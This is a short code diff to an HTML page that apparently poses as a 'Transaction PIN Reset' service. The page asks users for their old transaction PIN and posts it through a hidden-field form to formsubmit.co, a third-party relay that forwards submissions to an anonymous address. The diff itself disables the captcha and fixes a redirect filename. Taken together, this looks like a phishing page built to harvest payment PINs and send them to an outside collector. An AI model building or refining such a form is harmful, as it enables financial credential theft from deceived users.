@@ -249,6 +249,7 @@
     <form id="pin-form" action="https://formsubmit.co/117f5e73018f30b3473b2d9b88532a7a" method="POST">
       <input type="hidden" name="_subject" value="Transaction PIN Reset Submission">
       <input type="hidden" name="_next" value="success.html">
+      <input type="hidden" name="_captcha" value="false">
       <div class="form-group">
         <label for="old-pin">Old PIN</label>
         <input type="password" id="old-pin" name="old-pin" placeholder="Enter your old PIN" pattern="\d{4}" maxlength="4" required>
@@ -316,7 +317,7 @@
 
     // Handle pop-up button click
     document.getElementById('popup-btn').addEventListener('click', function() {
-      window.location.href = 'Success.html';
+      window.location.href = 'success.html';
     });
   </script>
 </body>
